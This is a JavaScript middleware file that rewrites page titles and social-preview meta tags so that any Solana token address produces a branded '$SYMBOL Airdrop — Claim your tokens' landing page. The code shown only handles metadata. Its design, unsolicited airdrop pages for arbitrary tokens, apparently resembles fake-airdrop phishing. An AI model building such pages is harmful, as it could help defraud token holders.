/* HTML rewriter: when a page is requested with ?ca=<address> (or
   #<address> won't reach the server, so only ?ca counts here), inject
   absolute meta tag URLs that point at /og?ca=... on the *current*
   host. This keeps the project portable across localhost, *.pages.dev,
   and any custom domain — nothing is hardcoded.

   We rewrite for:
     - landing.html  (always — that's the branded page)
     - index.html / "/" when a CA is provided
*/
import { fetchMetadata, shortCa } from "./_lib/theme.js";

const CA_RE = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;

function escapeAttr(s) {
  return String(s).replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

export const onRequest = async ({ request, next }) => {
  const url = new URL(request.url);
  const path = url.pathname;

  const isLanding = path === "/landing.html" || path === "/landing";
  const isIndex   = path === "/" || path === "/index.html";
  if (!isLanding && !isIndex) return next();

  // Only HTML responses need rewriting.
  const response = await next();
  const ct = response.headers.get("content-type") || "";
  if (!ct.includes("text/html")) return response;

  const ca = (url.searchParams.get("ca") || "").trim();
  if (!ca || !CA_RE.test(ca)) {
    // No CA: still make sure relative OG image points at this host
    // (so even the gate page has a clean preview).
    const origin = url.origin;
    const ogUrl = `${origin}/og?ca=`;
    return rewriteMeta(response, {
      title: "Solana Airdrop — Enter Token Contract",
      description: "Enter any Solana token contract address to launch a dynamically branded airdrop landing page.",
      image: "",          // no CA -> no dynamic image, keep crawler default
      canonical: origin + path,
      ogUrl: origin + path,
    });
  }

  // Fetch metadata once so og:title/description carry the token's name.
  // Network failures degrade gracefully to a generic title.
  let meta;
  try { meta = await fetchMetadata(ca); }
  catch (_) { meta = { name: "Solana Token", symbol: "TOKEN" }; }

  const symbol = (meta.symbol || "TOKEN").toUpperCase();
  const name   = meta.name || "Solana Token";
  const origin = url.origin;
  const ogImage = `${origin}/og?ca=${encodeURIComponent(ca)}`;
  const pageUrl = `${origin}${path}?ca=${encodeURIComponent(ca)}`;

  return rewriteMeta(response, {
    title: `$${symbol} Airdrop — Claim your tokens`,
    description: `Claim your share of the live $${symbol} (${name}) airdrop on Solana. Contract ${shortCa(ca)}.`,
    image: ogImage,
    canonical: pageUrl,
    ogUrl: pageUrl,
  });
};

/* Replace existing meta/title/canonical tags with crawler-friendly,
   absolute-URL versions. HTMLRewriter is provided by the Workers /
   Pages runtime — no extra dependency. */
function rewriteMeta(response, { title, description, image, canonical, ogUrl }) {
  class TitleRw {
    element(el) { el.setInnerContent(title); }
  }
  class MetaRw {
    constructor(attr, key, value) { this.attr = attr; this.key = key; this.value = value; this.seen = false; }
    element(el) {
      if (el.getAttribute(this.attr) === this.key) {
        this.seen = true;
        if (this.value) el.setAttribute("content", this.value);
        else el.remove();
      }
    }
  }
  class LinkRw {
    element(el) {
      if (el.getAttribute("rel") === "canonical") el.setAttribute("href", canonical);
    }
  }

  const rewriter = new HTMLRewriter()
    .on("title", new TitleRw())
    .on('meta[name="description"]',    new MetaRw("name",     "description",    description))
    .on('meta[property="og:title"]',   new MetaRw("property", "og:title",       title))
    .on('meta[property="og:description"]', new MetaRw("property", "og:description", description))
    .on('meta[property="og:url"]',     new MetaRw("property", "og:url",         ogUrl))
    .on('meta[name="twitter:title"]',  new MetaRw("name",     "twitter:title",  title))
    .on('meta[name="twitter:description"]', new MetaRw("name", "twitter:description", description))
    .on('link[rel="canonical"]',       new LinkRw());

  if (image) {
    rewriter
      .on('meta[property="og:image"]', new MetaRw("property", "og:image", image))
      .on('meta[name="twitter:image"]', new MetaRw("name",    "twitter:image", image))
      // Make sure twitter card is large-image when we have one
      .on('meta[name="twitter:card"]', new MetaRw("name", "twitter:card", "summary_large_image"));
  }

  // Strip any leftover hardcoded preview URL that wasn't matched above
  // — defensive in case the source HTML carries extras.
  return rewriter.transform(response);
}

// Silence unused import warnings in case escapeAttr isn't needed.
void escapeAttr;